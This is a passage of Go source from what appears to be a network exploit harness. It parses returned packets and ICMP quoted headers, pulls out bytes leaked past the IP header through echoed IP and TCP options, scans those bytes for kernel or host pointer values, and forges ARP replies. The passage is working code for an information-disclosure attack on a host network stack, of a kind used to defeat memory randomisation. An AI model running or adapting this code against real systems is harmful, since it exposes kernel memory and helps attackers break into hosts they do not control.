		if tcpEcho && toLocalMAC {
			if leak, ok := egressTCPEchoLeak(outer, src, dst, tcpSrcPort, tcpDstPort); ok {
				stats.matched = true
				stats.matchedPackets++
				stats.tcpEchoReplies++
				fmt.Printf("tcp-option-echo: src=%s source_port=%d destination_port=%d leak_len=%d\n",
					net.IP(outer[12:16]), tcpDstPort, tcpSrcPort, len(leak))
				fmt.Printf("  past-linear hex=%s ascii=%q\n", hex.EncodeToString(leak), string(leak))
				printKernelPointerCandidates("  ", leak)
			}
		}
		if toLocalMAC && expectedID && net.IP(outer[16:20]).Equal(dst) && int(outer[0]&0x0f)*4 > ipLen {
			stats.matched = true
			stats.matchedPackets++
			stats.returnedPackets++
			stats.matchedIDs[outerID] = struct{}{}
			fmt.Printf("returned: id=0x%04x first=0x%02x ihl=%d bytes=%d src_mac=%s\n",
				outerID, outer[0], int(outer[0]&0x0f)*4, len(outer), net.HardwareAddr(frame[6:12]))
			egressPrintOptions(outer, head)
		}
		if outer[9] != ipProtoICMP {
			continue
		}
		stats.icmpPackets++
		outerIHL := int(outer[0]&0x0f) * 4
		if outerIHL < ipLen || len(outer) < outerIHL+8+ipLen {
			continue
		}
		icmp := outer[outerIHL:]
		if icmp[0] != 3 && icmp[0] != 11 && icmp[0] != 12 {
			continue
		}
		quoted := icmp[8:]
		if quoted[0]>>4 != 4 {
			continue
		}
		switch quoted[9] {
		case ipProtoRaw:
			stats.quoted253++
		case ipProtoTCP:
			stats.quotedTCP++
		case ipProtoUDP:
			stats.quotedUDP++
		}
		if quoted[9] != proto {
			continue
		}
		quotedID := binary.BigEndian.Uint16(quoted[4:])
		quotedDst := net.IP(quoted[16:20])
		_, expectedID = expected[quotedID]
		if !expectedID || !quotedDst.Equal(dst) {
			fmt.Printf("icmp-unmatched: type=%d code=%d quoted_id=0x%04x quoted_dst=%s expected_dst=%s\n",
				icmp[0], icmp[1], quotedID, quotedDst, dst)
			continue
		}
		stats.matched = true
		stats.matchedPackets++
		stats.matchedIDs[quotedID] = struct{}{}
		ihl := int(quoted[0]&0x0f) * 4
		fmt.Printf("icmp: type=%d code=%d id=0x%04x first=0x%02x ihl=%d quoted=%d\n",
			icmp[0], icmp[1], quotedID, quoted[0], ihl, len(quoted))
		egressPrintOptions(quoted, head)
	}
	return stats, nil
}

func egressTCPEchoLeak(ip []byte, local, remote net.IP, localPort, remotePort uint16) ([]byte, bool) {
	if len(ip) < ipLen || ip[0]>>4 != 4 || ip[9] != ipProtoTCP ||
		!net.IP(ip[12:16]).Equal(remote) || !net.IP(ip[16:20]).Equal(local) {
		return nil, false
	}
	ihl := int(ip[0]&0x0f) * 4
	if ihl < ipLen || ihl > len(ip) || len(ip) < ihl+20 {
		return nil, false
	}
	tcp := ip[ihl:]
	if binary.BigEndian.Uint16(tcp[0:2]) != remotePort || binary.BigEndian.Uint16(tcp[2:4]) != localPort {
		return nil, false
	}
	options := ip[ipLen:ihl]
	for off := 0; off < len(options); {
		switch options[off] {
		case 0:
			return nil, false
		case 1:
			off++
			continue
		}
		if off+2 > len(options) {
			return nil, false
		}
		optionLen := int(options[off+1])
		if optionLen < 2 || off+optionLen > len(options) {
			return nil, false
		}
		if options[off] == 0x44 && optionLen == 36 && options[off+2] == 37 {
			return append([]byte(nil), options[off+4:off+optionLen]...), true
		}
		off += optionLen
	}
	return nil, false
}

func egressPrintOptions(ip []byte, head int) {
	if len(ip) < ipLen {
		return
	}
	available := min(int(ip[0]&0x0f)*4, len(ip))
	if available <= ipLen {
		return
	}
	options := ip[ipLen:available]
	fmt.Printf("  options %d bytes: %s\n", len(options), hex.EncodeToString(options))
	if len(options) > head {
		leak := options[head:]
		fmt.Printf("  past-linear hex=%s ascii=%q\n", hex.EncodeToString(leak), string(leak))
		printKernelPointerCandidates("  ", leak)
	}
}

type kernelPointerCandidate struct {
	offset int
	value  uint64
}

func kernelPointerCandidates(data []byte) []kernelPointerCandidate {
	var out []kernelPointerCandidate
	for offset := 0; offset+8 <= len(data); offset++ {
		value := binary.LittleEndian.Uint64(data[offset : offset+8])
		if value>>48 == 0xffff && value&0x7 == 0 {
			out = append(out, kernelPointerCandidate{offset: offset, value: value})
		}
	}
	return out
}

func printKernelPointerCandidates(prefix string, data []byte) {
	for _, candidate := range kernelPointerCandidates(data) {
		fmt.Printf("%shost-pointer-candidate offset=%d little=0x%016x\n",
			prefix, candidate.offset, candidate.value)
	}
}

func egressARPRequest(frame []byte, target net.IP) (net.HardwareAddr, net.IP, bool) {
	proto, arp := ethernetPayload(frame)
	if proto != ethPArp || len(arp) < 28 ||
		binary.BigEndian.Uint16(arp[0:2]) != 1 ||
		binary.BigEndian.Uint16(arp[2:4]) != ipProtoEth ||
		arp[4] != 6 || arp[5] != 4 || binary.BigEndian.Uint16(arp[6:8]) != 1 ||
		!net.IP(arp[24:28]).Equal(target) {
		return nil, nil, false
	}
	return append(net.HardwareAddr(nil), arp[8:14]...), append(net.IP(nil), arp[14:18]...), true
}

func egressARPReply(srcMAC, dstMAC net.HardwareAddr, srcIP, dstIP net.IP) []byte {
	frame := make([]byte, ethLen+28)
	copy(frame[0:6], dstMAC)
	copy(frame[6:12], srcMAC)
	binary.BigEndian.PutUint16(frame[12:14], ethPArp)
	arp := frame[ethLen:]
	binary.BigEndian.PutUint16(arp[0:2], 1)
	binary.BigEndian.PutUint16(arp[2:4], ipProtoEth)
	arp[4], arp[5] = 6, 4
	binary.BigEndian.PutUint16(arp[6:8], 2)
	copy(arp[8:14], srcMAC)
	copy(arp[14:18], srcIP.To4())
	copy(arp[18:24], dstMAC)
	copy(arp[24:28], dstIP.To4())
	return frame
}

func routeUint(ip net.IP) uint32 {
	ip = ip.To4()
	return uint32(ip[0]) | uint32(ip[1])<<8 | uint32(ip[2])<<16 | uint32(ip[3])<<24
}

func routeIPv4(v uint32) net.IP {
	return net.IPv4(byte(v), byte(v>>8), byte(v>>16), byte(v>>24)).To4()
}
